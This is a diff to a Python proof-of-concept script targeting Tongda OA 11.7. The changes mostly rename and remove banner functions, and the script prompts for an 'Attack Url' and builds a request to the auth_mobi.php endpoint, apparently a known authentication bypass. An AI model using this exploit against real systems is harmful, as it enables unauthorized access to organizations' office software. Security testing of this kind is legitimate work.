@@ -5,7 +5,7 @@ import re
 import time
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-def banner():
+def title():
     # 定义横幅
     banner = """
          __  __     ______     __  __     ______     __  __     ______     __  __     ______    
@@ -16,14 +16,6 @@ def banner():
                                                                                              
 """
     print(banner)
-
-def title():
-    print('+------------------------------------------')
-    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
-    print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')
-    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
-    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
-    print('+------------------------------------------')
 
 def POC_1(target_url):
     vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
@@ -46,7 +38,6 @@ def POC_1(target_url):
 
 
 if __name__ == '__main__':
-    banner()
     title()
     target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
     while True:
